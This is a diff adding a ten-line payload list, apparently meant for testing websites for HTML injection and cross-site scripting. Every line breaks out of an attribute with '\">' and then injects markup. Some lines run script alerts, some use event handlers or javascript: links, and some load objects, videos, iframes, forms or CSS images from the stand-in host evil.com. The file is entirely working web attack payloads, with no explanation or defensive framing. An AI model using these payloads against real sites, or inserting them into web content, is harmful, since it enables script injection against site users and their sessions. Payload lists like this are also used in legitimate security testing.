@@ -1,0 +1,10 @@
+"><script>alert('HTML Injection by Ax01')</script>
+"><img src="https://evil.com/injection.png" onerror="javascript:alert('HTML Injection')"
+"><a href="javascript:alert('HTML Injection')">Click Here</a>
+"><p style="display:none">HTML Injection</p>
+"><div onmouseover="javascript:alert('HTML Injection by Ax01')">Hover over me</div>
+"><object data="https://evil.com/injection.swf" type="application/x-shockwave-flash"></object>
+"><video src="https://evil.com/injection.mp4" autoplay onended="javascript:alert('HTML Injection by Ax01')"></video>
+"><iframe src="https://evil.com/injection.html"></iframe>
+"><form action="https://evil.com/injection" method="post"><input type="hidden" name="injection" value="true" /></form>
+"><style>body { background-image: url('https://evil.com/injection.jpg') }</style>
